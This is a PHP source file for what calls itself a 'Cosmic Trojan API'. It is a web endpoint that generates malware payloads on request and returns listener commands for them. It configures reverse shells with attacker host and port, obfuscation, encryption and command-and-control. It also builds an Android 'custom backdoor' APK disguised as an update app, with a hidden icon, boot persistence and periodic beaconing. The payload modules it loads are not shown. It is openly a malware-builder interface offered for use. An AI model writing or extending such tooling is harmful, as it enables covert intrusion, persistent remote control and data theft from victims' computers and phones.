<?php
/**
 * COSMIC TROJAN API v2.0 – Supports all payload types including Android Custom.
 */
require_once "includes/security_functions.php";

// Load available modules
$advanced_module = null;
$android_module = null;
$basic_module = null;

if (file_exists(__DIR__ . '/../system/modules/AdvancedPayloadModule.php')) {
    require_once __DIR__ . '/../system/modules/AdvancedPayloadModule.php';
    if (class_exists('AdvancedPayloadModule')) {
        $advanced_module = new AdvancedPayloadModule();
    }
}
if (file_exists(__DIR__ . '/../system/modules/AndroidTrojanModule.php')) {
    require_once __DIR__ . '/../system/modules/AndroidTrojanModule.php';
    if (class_exists('AndroidTrojanModule')) {
        $android_module = new AndroidTrojanModule();
    }
}
if (file_exists(__DIR__ . '/../system/modules/TrojanModule.php')) {
    require_once __DIR__ . '/../system/modules/TrojanModule.php';
    if (class_exists('EnhancedTrojanModule')) {
        $basic_module = new EnhancedTrojanModule();
    }
}

header('Content-Type: application/json');
$action = $_GET['action'] ?? $_POST['action'] ?? '';

$response = ['status' => 'error', 'message' => 'Invalid action'];

switch ($action) {
    case 'generate':
        $type = $_POST['type'] ?? $_GET['type'] ?? 'reverse_shell';
        $config = [
            'type'     => $type,
            'platform' => $_POST['platform'] ?? $_GET['platform'] ?? 'linux',
            'format'   => $_POST['format'] ?? $_GET['format'] ?? 'sh',
            'lhost'    => $_POST['lhost'] ?? $_GET['lhost'] ?? '127.0.0.1',
            'lport'    => (int)($_POST['lport'] ?? $_GET['lport'] ?? 4444),
            'encryption' => $_POST['encryption'] ?? $_GET['encryption'] ?? 'none',
            'extra'    => [
                'c2_enabled' => isset($_POST['c2_enabled']) || isset($_GET['c2_enabled']),
                'obfuscation_level' => $_POST['obfuscation_level'] ?? $_GET['obfuscation_level'] ?? 'medium',
            ]
        ];

        // Add Android‑specific options if present
        if (isset($_POST['app_name']) || isset($_GET['app_name'])) {
            $config['app_name'] = $_POST['app_name'] ?? $_GET['app_name'] ?? 'CosmicUpdate';
            $config['package_name'] = $_POST['package_name'] ?? $_GET['package_name'] ?? 'com.cosmic.update';
            $config['persistence'] = $_POST['persistence'] ?? $_GET['persistence'] ?? 'boot';
            $config['disguise'] = isset($_POST['disguise']) || isset($_GET['disguise']);
            $config['hide_icon'] = isset($_POST['hide_icon']) || isset($_GET['hide_icon']);
            $config['beacon_interval'] = (int)($_POST['beacon_interval'] ?? $_GET['beacon_interval'] ?? 60);
            $config['use_encryption'] = isset($_POST['use_encryption']) || isset($_GET['use_encryption']);
        }

        try {
            if ($type === 'android_custom') {
                if (!$android_module) {
                    throw new Exception('AndroidTrojanModule not available.');
                }
                $result = $android_module->generate_payload($config);
                $response = ['status' => 'success', 'data' => $result];
            } elseif ($advanced_module) {
                // Try advanced module for other types
                $result = $advanced_module->generate_payload($config);
                $response = ['status' => 'success', 'data' => $result];
            } elseif ($basic_module) {
                // Fallback to basic module
                $result = $basic_module->generate_advanced_payload($config);
                $response = ['status' => 'success', 'data' => $result];
            } else {
                $response['message'] = 'No payload module available.';
            }
        } catch (Exception $e) {
            $response['message'] = $e->getMessage();
        }
        break;

    case 'types':
        $data = [];
        if ($advanced_module) {
            $data['advanced'] = $advanced_module->get_payload_types();
        }
        if ($android_module) {
            // We don't have a get_payload_types in AndroidTrojanModule, so we describe manually
            $data['android_custom'] = [
                'name' => 'Android Custom Backdoor',
                'description' => 'Fully custom Android APK with C2 and persistence',
                'platforms' => ['android'],
                'formats' => ['apk']
            ];
        }
        if ($basic_module) {
            $data['basic'] = $basic_module->get_payload_types();
        }
        $response = ['status' => 'success', 'data' => $data];
        break;

    case 'listeners':
        $type = $_GET['type'] ?? 'reverse_shell';
        $lhost = $_GET['lhost'] ?? '127.0.0.1';
        $lport = $_GET['lport'] ?? 4444;
        $commands = [];
        if ($advanced_module) {
            $commands = $advanced_module->generate_listener_rc($type, $lhost, $lport);
        } elseif ($basic_module) {
            $commands = $basic_module->generate_listener_command($type, $lhost, $lport);
        }
        $response = ['status' => 'success', 'listener_commands' => $commands];
        break;

    default:
        $response['message'] = 'Unknown action. Available: generate, types, listeners';
}

echo json_encode($response, JSON_PRETTY_PRINT);
